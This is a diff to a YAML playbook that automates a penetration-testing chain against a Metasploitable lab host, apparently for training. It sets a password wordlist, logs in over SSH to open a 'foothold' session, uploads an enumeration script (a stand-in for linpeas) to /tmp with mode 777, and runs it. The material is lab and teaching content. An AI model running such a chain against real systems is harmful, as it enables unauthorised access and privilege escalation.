@@ -26,8 +26,8 @@
 #
 
 vars:
-  METASPLOITABLE: 172.17.0.106
-  PASSWDLIST: /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+  METASPLOITABLE: 10.110.0.31
+  PASSWDLIST: ./passwordlist.txt
 
 commands:
   # ============================================
@@ -70,7 +70,7 @@ commands:
   - type: ssh
     cmd: id
     username: user
-    password: "$USERPW"
+    password: $USERPW
     hostname: $METASPLOITABLE
     creates_session: "foothold"
 
@@ -83,13 +83,16 @@ commands:
   # ============================================
   - type: sftp
     cmd: put
-    local_path: /opt/tools/linpeas.sh
+    # a small custom enumaration scriot as stand in for linpeas
+    local_path: /training/day1/exercises/enum.sh
+    # this is where the actual linpeas script is usually saved on installation
+    # local_path: /opt/tools/linpeas.sh
     remote_path: /tmp/linpeas.sh
     session: "foothold"
     mode: "777"
 
   - type: debug
-    cmd: "Executing LinPeas in superfast mode (-s). This skips slow checks but still detects SUID binaries."
+    cmd: "Executing enumaration script (custom or actual linpaes, depending on the step above)"
 
   # ============================================
   # STEP 5b: Execute LinPeas
